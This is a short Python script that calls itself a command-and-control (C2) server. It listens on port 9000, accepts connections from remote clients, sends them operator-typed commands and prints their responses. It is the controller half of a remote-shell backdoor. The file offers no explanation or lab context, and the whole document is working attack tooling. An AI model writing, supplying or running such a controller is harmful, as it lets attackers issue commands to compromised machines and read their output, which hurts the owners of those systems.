import socket

def start_c2_server(host='0.0.0.0', port=9000):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"[+] C2 Server started on {host}:{port}")
    
    while True:
        client_socket, client_address = server_socket.accept()
        print(f"[+] Connection established with {client_address}")
        handle_client(client_socket)

def handle_client(client_socket):
    try:
        while True:
            command = input("C2 > ").strip()
            if not command:
                continue
            client_socket.send(command.encode())
            
            if command.lower() in ['exit', 'quit']:
                print("[+] Closing connection with client.")
                client_socket.close()
                break
            
            response = client_socket.recv(4096).decode()
            print(f"Client Response:\n{response}")
    except ConnectionResetError:
        print("[-] Connection lost with client.")
    except Exception as e:
        print(f"[-] Error: {e}")
        client_socket.close()

if __name__ == "__main__":
    start_c2_server()
